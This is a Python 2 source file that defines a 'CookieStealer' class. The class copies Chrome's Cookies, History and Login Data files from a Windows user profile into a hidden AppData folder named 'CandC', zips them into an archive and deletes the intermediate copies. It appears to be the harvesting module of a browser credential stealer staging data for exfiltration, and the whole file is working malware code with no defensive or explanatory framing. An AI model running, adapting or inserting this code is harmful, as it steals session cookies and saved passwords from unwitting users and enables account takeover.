import os
import shutil

SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
USERDATA_PATH = SAVE_FILES + "\\User Data\\"
CHROME_COOKIE_PATH = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default'

class CookieStealer():

    def __init__(self):
        pass

    def stealer(self):
        

        cookiefile = CHROME_COOKIE_PATH + "\\Cookies"
        historyfile = CHROME_COOKIE_PATH + "\\History"
        LoginDatafile = CHROME_COOKIE_PATH + "\\Login Data"

        filesindir = os.listdir(USERDATA_PATH)
        
        try:
            print '[*] Copying cookies to path'
            if cookiefile not in filesindir:
                shutil.copy2(cookiefile, USERDATA_PATH)
            if historyfile not in filesindir:
                shutil.copy2(historyfile, USERDATA_PATH)
            if LoginDatafile not in filesindir:
                shutil.copy2(LoginDatafile, USERDATA_PATH)
            print '[*] Files copied'
            return True
        except Exception as e:
            print '[*] Error in copying cookies'
            print e
            return False


    def zipAttachments(self):
        print '[*] Zipping attachments'
        arch_name = USERDATA_PATH + "CHL"
        files = ["Cookies", "History", "Login Data"]
        try:
            shutil.make_archive(arch_name, 'zip', USERDATA_PATH)
            print '[*] Attachments zipped'
        except Exception as e:
            print '==> Error in making archive'
            print e
        for file in files:
            try:
                os.remove(USERDATA_PATH + file)
            except Exception as e:
                print e
    
    
    def run(self):
        self.stealer()
        self.zipAttachments()
        

# a = CookieStealer()
# a.run()
# a.zipattachments()